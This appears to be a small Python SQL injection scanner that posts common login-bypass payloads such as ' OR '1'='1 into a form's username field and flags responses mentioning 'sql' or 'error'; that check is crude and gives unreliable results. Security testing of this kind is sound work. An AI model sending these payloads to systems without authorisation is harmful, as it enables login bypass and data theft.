import requests

def test_sql_injection(url):
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR 1=1 --",
        "' OR '1'='1' #",
        "' OR 1=1;--",
    ]

    results = []

    for payload in payloads:
        try:
            response = requests.post(url, data={"username": payload, "password": "password"})
            if response.status_code == 200 and ("sql" in response.text.lower() or "error" in response.text.lower()):
                results.append({"payload": payload, "vulnerable": True})
            else:
                results.append({"payload": payload, "vulnerable": False})
        except Exception as e:
            return {"error": f"Error testing SQL Injection: {str(e)}"}

    return {"results": results}
